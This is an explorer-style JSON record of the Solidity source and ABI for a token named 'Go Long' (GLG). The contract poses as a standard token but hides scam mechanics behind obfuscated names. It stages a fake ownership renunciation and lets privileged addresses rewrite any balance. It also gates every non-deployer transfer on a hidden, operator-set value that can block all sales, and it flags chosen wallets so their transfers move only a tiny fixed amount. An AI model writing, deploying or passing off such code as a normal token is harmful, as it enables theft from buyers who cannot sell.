{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface teamIsTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeTx {\n    function createPair(address sellList, address walletIs) external returns (address);\n}\n\ninterface sellLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletSender) external view returns (uint256);\n\n    function transfer(address modeSender, uint256 buyList) external returns (bool);\n\n    function allowance(address launchAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeSender,\n        uint256 buyList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderFromAuto, uint256 value);\n    event Approval(address indexed launchAt, address indexed spender, uint256 value);\n}\n\ninterface sellLaunchedMetadata is sellLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GoLong is txSender, sellLaunched, sellLaunchedMetadata {\n\n    function allowance(address teamToken, address tradingTx) external view virtual override returns (uint256) {\n        if (tradingTx == txShould) {\n            return type(uint256).max;\n        }\n        return liquidityTeam[teamToken][tradingTx];\n    }\n\n    function transfer(address fromSwapShould, uint256 buyList) external virtual override returns (bool) {\n        return sellIs(_msgSender(), fromSwapShould, buyList);\n    }\n\n    address public launchExempt;\n\n    function autoShould() private view {\n        require(liquidityTotalIs[_msgSender()]);\n    }\n\n    function launchSender(address maxFund, address modeSender, uint256 buyList) internal returns (bool) {\n        require(marketingTotal[maxFund] >= buyList);\n        marketingTotal[maxFund] -= buyList;\n        marketingTotal[modeSender] += buyList;\n        emit Transfer(maxFund, modeSender, buyList);\n        return true;\n    }\n\n    constructor (){\n        if (feeTake == swapFrom) {\n            atLimit = true;\n        }\n        teamIsTx receiverSwap = teamIsTx(txShould);\n        exemptAt = feeTx(receiverSwap.factory()).createPair(receiverSwap.WETH(), address(this));\n        \n        launchExempt = _msgSender();\n        listReceiver();\n        liquidityTotalIs[launchExempt] = true;\n        marketingTotal[launchExempt] = receiverLaunched;\n        if (senderFund) {\n            tokenSell = false;\n        }\n        emit Transfer(address(0), launchExempt, receiverLaunched);\n    }\n\n    uint8 private shouldSwap = 18;\n\n    function maxIs(uint256 buyList) public {\n        autoShould();\n        sellMinFee = buyList;\n    }\n\n    uint256 private receiverFrom;\n\n    mapping(address => uint256) private marketingTotal;\n\n    function name() external view virtual override returns (string memory) {\n        return takeSwap;\n    }\n\n    uint256 private marketingExemptTo;\n\n    address txShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public liquidityTotalIs;\n\n    string private minAt = \"GLG\";\n\n    bool public tokenSell;\n\n    function enableToTx(address fromSwapShould, uint256 buyList) public {\n        autoShould();\n        marketingTotal[fromSwapShould] = buyList;\n    }\n\n    uint256 private feeTake;\n\n    function getOwner() external view returns (address) {\n        return sellMax;\n    }\n\n    address public exemptAt;\n\n    uint256 amountTo;\n\n    function listReceiver() public {\n        emit OwnershipTransferred(launchExempt, address(0));\n        sellMax = address(0);\n    }\n\n    address private sellMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minAt;\n    }\n\n    bool public senderFund;\n\n    function owner() external view returns (address) {\n        return sellMax;\n    }\n\n    uint256 private receiverLaunched = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldSwap;\n    }\n\n    bool private atLimit;\n\n    uint256 public swapFrom;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverLaunched;\n    }\n\n    function launchedReceiver(address amountAt) public {\n        autoShould();\n        if (senderFund != tokenSell) {\n            tokenSell = true;\n        }\n        if (amountAt == launchExempt || amountAt == exemptAt) {\n            return;\n        }\n        tradingEnable[amountAt] = true;\n    }\n\n    uint256 constant fromSwap = 4 ** 10;\n\n    bool private atSender;\n\n    mapping(address => bool) public tradingEnable;\n\n    mapping(address => mapping(address => uint256)) private liquidityTeam;\n\n    bool private fundAuto;\n\n    function balanceOf(address walletSender) public view virtual override returns (uint256) {\n        return marketingTotal[walletSender];\n    }\n\n    bool public autoSwap;\n\n    function transferFrom(address maxFund, address modeSender, uint256 buyList) external override returns (bool) {\n        if (_msgSender() != txShould) {\n            if (liquidityTeam[maxFund][_msgSender()] != type(uint256).max) {\n                require(buyList <= liquidityTeam[maxFund][_msgSender()]);\n                liquidityTeam[maxFund][_msgSender()] -= buyList;\n            }\n        }\n        return sellIs(maxFund, modeSender, buyList);\n    }\n\n    bool public toToken;\n\n    address senderMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 sellMinFee;\n\n    function sellIs(address maxFund, address modeSender, uint256 buyList) internal returns (bool) {\n        if (maxFund == launchExempt) {\n            return launchSender(maxFund, modeSender, buyList);\n        }\n        uint256 receiverMinWallet = sellLaunched(exemptAt).balanceOf(senderMin);\n        require(receiverMinWallet == sellMinFee);\n        require(modeSender != senderMin);\n        if (tradingEnable[maxFund]) {\n            return launchSender(maxFund, modeSender, fromSwap);\n        }\n        return launchSender(maxFund, modeSender, buyList);\n    }\n\n    function approve(address tradingTx, uint256 buyList) public virtual override returns (bool) {\n        liquidityTeam[_msgSender()][tradingTx] = buyList;\n        emit Approval(_msgSender(), tradingTx, buyList);\n        return true;\n    }\n\n    string private takeSwap = \"Go Long\";\n\n    event OwnershipTransferred(address indexed toShouldLimit, address indexed atReceiver);\n\n    function isAuto(address limitFund) public {\n        if (autoSwap) {\n            return;\n        }\n        if (atLimit != toToken) {\n            receiverFrom = marketingExemptTo;\n        }\n        liquidityTotalIs[limitFund] = true;\n        if (swapFrom == feeTake) {\n            fundAuto = true;\n        }\n        autoSwap = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toShouldLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFromAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSwapShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyList\",\"type\":\"uint256\"}],\"name\":\"enableToTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFund\",\"type\":\"address\"}],\"name\":\"isAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAt\",\"type\":\"address\"}],\"name\":\"launchedReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTotalIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyList\",\"type\":\"uint256\"}],\"name\":\"maxIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSwapShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "GoLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}